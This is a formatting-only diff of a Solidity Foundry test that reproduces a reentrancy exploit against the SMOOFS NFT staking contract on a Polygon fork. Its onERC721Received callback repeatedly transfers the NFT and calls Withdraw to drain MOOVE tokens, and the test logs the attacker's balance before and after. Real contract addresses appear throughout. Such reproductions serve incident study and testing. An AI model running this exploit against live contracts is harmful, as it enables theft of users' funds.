@@ -15,25 +15,23 @@ import "./../interface.sol";
 // https://twitter.com/0xNickLFranklin/status/1762895774311178251
 
 interface ISMOOFSStaking {
-    function Stake(uint256 _tokenId) external;
+    function Stake(
+        uint256 _tokenId
+    ) external;
 
     function Withdraw(uint256 _tokenId, bool forceWithTax) external;
 }
 
 contract ContractTest is Test {
-    ISMOOFSStaking private constant SMOOFSStaking =
-        ISMOOFSStaking(0x757C2d1Ef0942F7a1B9FC1E618Aea3a6F3441A3C);
-    IERC721 private constant Smoofs =
-        IERC721(0x551eC76C9fbb4F705F6b0114d1B79bb154747D38);
-    IERC20 private constant MOOVE =
-        IERC20(0xdb6dAe4B87Be1289715c08385A6Fc1A3D970B09d);
-    address private constant attackContract =
-        0x367120bf791cC03F040E2574AeA0ca7790D3D2E5;
-    uint256 private constant smoofsTokenId = 2_062;
+    ISMOOFSStaking private constant SMOOFSStaking = ISMOOFSStaking(0x757C2d1Ef0942F7a1B9FC1E618Aea3a6F3441A3C);
+    IERC721 private constant Smoofs = IERC721(0x551eC76C9fbb4F705F6b0114d1B79bb154747D38);
+    IERC20 private constant MOOVE = IERC20(0xdb6dAe4B87Be1289715c08385A6Fc1A3D970B09d);
+    address private constant attackContract = 0x367120bf791cC03F040E2574AeA0ca7790D3D2E5;
+    uint256 private constant smoofsTokenId = 2062;
     uint256 setCount;
 
     function setUp() public {
-        vm.createSelectFork("polygon", 54056707);
+        vm.createSelectFork("polygon", 54_056_707);
         vm.label(address(SMOOFSStaking), "SMOOFSStaking");
         vm.label(address(Smoofs), "Smoofs");
         vm.label(address(MOOVE), "MOOVE");
@@ -51,18 +49,14 @@ contract ContractTest is Test {
         MOOVE.approve(address(SMOOFSStaking), type(uint256).max);
 
         emit log_named_decimal_uint(
-            "Attacker MOOVE balance before exploit",
-            MOOVE.balanceOf(address(this)),
-            MOOVE.decimals()
+            "Attacker MOOVE balance before exploit", MOOVE.balanceOf(address(this)), MOOVE.decimals()
         );
         // In my case call to Stake() take some time when I ran POC for the first time.
         SMOOFSStaking.Stake(smoofsTokenId);
         SMOOFSStaking.Withdraw(smoofsTokenId, true);
 
         emit log_named_decimal_uint(
-            "Attacker MOOVE balance after exploit",
-            MOOVE.balanceOf(address(this)),
-            MOOVE.decimals()
+            "Attacker MOOVE balance after exploit", MOOVE.balanceOf(address(this)), MOOVE.decimals()
         );
     }
 
@@ -74,11 +68,7 @@ contract ContractTest is Test {
     ) external returns (bytes4) {
         while (setCount < 9) {
             ++setCount;
-            Smoofs.safeTransferFrom(
-                address(this),
-                address(SMOOFSStaking),
-                smoofsTokenId
-            );
+            Smoofs.safeTransferFrom(address(this), address(SMOOFSStaking), smoofsTokenId);
             SMOOFSStaking.Withdraw(smoofsTokenId, true);
         }
         return this.onERC721Received.selector;
